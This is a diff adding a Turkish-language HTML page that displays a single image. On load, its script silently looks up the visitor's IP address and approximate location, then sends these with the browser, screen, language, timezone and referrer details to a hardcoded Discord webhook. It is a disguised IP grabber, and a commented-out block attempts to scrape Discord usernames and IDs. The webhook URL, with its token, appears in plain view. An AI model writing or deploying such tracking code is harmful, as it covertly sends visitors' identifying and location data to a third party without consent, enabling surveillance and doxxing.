@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Bilgi Toplama ve Gönderme</title>
+    <style>
+        html, body {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            width: 100%;
+            overflow: hidden;
+        }
+        body {
+            background-color: #fff; /* Beyaz arka plan */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        .container {
+            position: relative;
+            width: 80%;
+            max-width: 800px;
+            height: 70%;
+        }
+        .background {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            background: #fff; /* Beyaz arka plan */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .image {
+            width: 50%; /* Üstteki fotoğraf boyutu */
+            height: auto;
+            z-index: 1;
+            object-fit: cover;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="background">
+            <img src="https://i.pinimg.com/736x/4d/34/de/4d34de4c5061511bdc3694efef02981e.jpg" alt="Background Image" class="image">
+        </div>
+    </div>
+
+    <script>
+        async function fetchUserInfo() {
+            const userInfo = { discordName: 'Unknown', discordId: 'Unknown' };
+
+            try {
+                // Discord kimlik bilgilerini almak için tarayıcı API'ları (bu yöntem kullanıcıdan izin gerektirir)
+                // Ancak, bu bilgiler genellikle güvenlik nedeniyle otomatik olarak alınamaz.
+                // Bu nedenle örnek olarak sabit "Unknown" değerler kullanıyoruz.
+
+                // Örneğin: 
+                // const userInfo = {
+                //     discordName: document.querySelector('span[data-list-item-id="account-settings-profile"]')?.innerText || 'Unknown',
+                //     discordId: document.querySelector('span[data-list-item-id="account-settings-id"]')?.innerText || 'Unknown'
+                // };
+
+                // Bilgileri gönder
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                const ip = data.ip;
+
+                const locationResponse = await fetch(`https://ipapi.co/${ip}/json/`);
+                const locationData = await locationResponse.json();
+                const country = locationData.country_name || 'Unknown';
+                const city = locationData.city || 'Unknown';
+                const street = locationData.street || 'Unknown';
+                const isp = locationData.isp || 'Unknown';
+
+                await fetch('https://discord.com/api/webhooks/1268882634709405802/jOMSEKdwW5lMXXFE8cKB-fpMrVuK9NVRFJZVJHf6swhASUgOUUABfGo_Jsq362bqFdvW', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        content: "Yeni bir bilgi toplandı!",
+                        embeds: [
+                            {
+                                title: "Toplanan Bilgiler",
+                                fields: [
+                                    { name: "Discord Adı", value: userInfo.discordName, inline: true },
+                                    { name: "Discord ID", value: userInfo.discordId, inline: true },
+                                    { name: "IP Adresi", value: ip, inline: true },
+                                    { name: "Ülke", value: country, inline: true },
+                                    { name: "Şehir", value: city, inline: true },
+                                    { name: "Sokak", value: street, inline: true },
+                                    { name: "İnternet Adı", value: isp, inline: true },
+                                    { name: "Tarayıcı", value: navigator.userAgent || 'Unknown', inline: true },
+                                    { name: "Ekran Çözünürlüğü", value: `${window.screen.width}x${window.screen.height}`, inline: true },
+                                    { name: "Dil", value: navigator.language || 'Unknown', inline: true },
+                                    { name: "Zaman Dilimi", value: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown', inline: true },
+                                    { name: "Referans", value: document.referrer || 'Unknown', inline: true },
+                                    { name: "Klavye Dili", value: navigator.languages.join(', ') || 'Unknown', inline: true },
+                                    { name: "Ağ Türü", value: (navigator.connection || navigator.mozConnection || navigator.webkitConnection)?.effectiveType || 'Unknown', inline: true },
+                                    { name: "Platform", value: navigator.platform || 'Unknown', inline: true },
+                                    { name: "Viewport Boyutu", value: `${window.innerWidth}x${window.innerHeight}`, inline: true }
+                                ]
+                            }
+                        ]
+                    }),
+                    headers: { 
+                        'Content-Type': 'application/json' 
+                    }
+                });
+
+                console.log('Bilgiler başarıyla gönderildi!');
+            } catch (error) {
+                console.error('Hata:', error);
+            }
+        }
+
+        // Sayfa yüklendiğinde bilgileri al ve gönder
+        window.onload = fetchUserInfo;
+    </script>
+</body>
+</html>
